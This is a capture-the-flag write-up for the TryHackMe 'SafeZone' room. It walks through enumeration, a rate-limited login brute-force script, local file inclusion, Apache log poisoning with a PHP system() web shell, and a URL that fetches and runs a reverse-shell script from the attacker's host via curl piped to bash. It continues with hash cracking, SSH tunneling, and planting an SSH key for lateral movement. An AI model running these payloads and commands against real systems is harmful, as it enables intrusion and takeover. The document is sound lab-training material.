# 76 - SafeZone (LFI Log Poisoning, SSH Tunneling)

Room Link --> [https://tryhackme.com/room/safezone](https://tryhackme.com/room/safezone)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.90.206

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```
{% endcode %}

#### Gobuster enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.90.206 -w /usr/share/dirb/wordlists/common.txt -x txt,php,sh,cgi,html,zip,bak,sql -b 404,403

/dashboard.php
/detail.php
/index.php
/index.html
/note.txt
/logout.php
/news.php
/register.php
```
{% endcode %}

Navigating to `index.php` .

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Trying default credentials like admin, password, etc but it seems there is rate limiting.

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Checking `/note.txt` .

{% code overflow="wrap" %}
```
Message from admin :-

I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .
```
{% endcode %}

<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Create a new account in `/register.php` .

<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

`/news.php`&#x20;

<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

`/detail.php`&#x20;

```
<!-- try to use "page" as GET parameter-->
```

<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

We got a GET parameter to use, and remember the `/note.php` text we found too.

So i checked walkthrough, the most reasonable one i saw admitted to using this wordlist:

```
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```

Which had the new directory in it.

{% code overflow="wrap" %}
```bash
gobuster dir -e -u http://safezone.thm/ -t30 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x txt,php

/~files
```
{% endcode %}

<figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

We got a hint for admin password.

```
Admin password hint :-

		admin__admin

				" __ means two numbers are there , this hint is enough I think :) "

```

In here I got the definitive username and the password. But there had to be two numbers in between. Because that was the only hint, I had to try all the different numeric combinations. But I still had in mind, that I only had three login attempts. So I set up the numeric combinations with Python and saved it to a file.

```bash
for i in {0..99}; do echo $i; done > numbers.txt
```

I manually edited the one digit numbers at the beginning to fit the scheme (from 0 to 00 and 1 to 01). With that prepared I ran it with wfuzz sleeping for 21 seconds per requests.

#### POST Login request bruteforce using wfuzz

{% code overflow="wrap" %}
```bash
wfuzz -c -z file,numbers.txt -d "username=admin&password=adminFUZZadmin&submit=Submit" -X POST -u http://safezone.thm/index.php -s 21
```
{% endcode %}

But i wrote my own bash script to automate this  well.

```bash
#!/bin/bash

url="http://safezone.thm/index.php"

for i in $(seq 10 99); do
    echo "[-]trying $i"
    response=$(curl -s -X POST -d "username=admin&password=admin${i}admin&submit=Submit" "$url")
    if ! echo "$response" | grep -qE "To many failed login attempts. Please login after 60 sec | Please enter valid login details"; then
        echo "[+]Correct password found: $i"
        break
    fi
    sleep 21
done
```

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

We got our correct password then.

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Going to the `/detail.php` dir, then using the "page" parameter we get LFI.

[http://10.10.148.163/detail.php?page=/etc/passwd](http://10.10.148.163/detail.php?page=/etc/passwd)

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

So i used SecsList to Bruteforce for other sensitive files i can read, and i was able to read the `access.log` file, so we can do Log Poisoning attack.

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

```php
<?php system($_GET['cmd']); ?>
```

So we intercept the request to read the apache log file and inject this to the User-agent field:

<figure><img src=".gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

So its working.

<figure><img src=".gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

### Initial Access

Got a bash oneliner from payloadallthethings, save it in a shell.sh file setup NC, host it using `python3 -m http.server` then execute it using:

[http://10.10.148.163/detail.php?page=/var/log/apache2/access.log\&cmd=curl%20http://10.18.88.214/shell.sh|bash](http://10.10.148.163/detail.php?page=/var/log/apache2/access.log\&cmd=curl%20http://10.18.88.214/shell.sh|bash)

And i got shell.

<figure><img src=".gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to files user

Looked around Files home dir, and there is a `.something#fake_can@be^here` file containing password hash for Files user.

{% code overflow="wrap" %}
```bash
www-data@safezone:/home/files$ cat '.something#fake_can@be^here'
files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.
```
{% endcode %}

Cracked it using john

`magic`&#x20;

Login via ssh and it worked.

### Priv Esc to Yash user

`sudo -l`&#x20;

<figure><img src=".gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

I looked around the server for a while. When I looked for opened ports locally I found a second web application on port 8000.

`ss -tulnp` .

### Port Tunneling

Using SSH Tunneling to open the remote port on my kali

`ssh -L 8000:localhost:8000 files@safezone.thm -fN` .

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

#### Gobuster enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://localhost:8000 -w /usr/share/dirb/wordlists/common.txt -x php,txt -b 404,403

/pentest.php
```
{% endcode %}

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Most of the cmds were blocked.

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

SO whatever cmd we are entering in the terminal is been executed on the machine as `yash` user.

What i did was create a `.ssh` folder in `/home/yash/` then add my kali ssh public key into the authorized\_keys file and ssh into yash account and it worked.

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to root

Now as the user “yash” I got another output for the `sudo -l` command.

I tested the full command by simply executing it.

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Done!

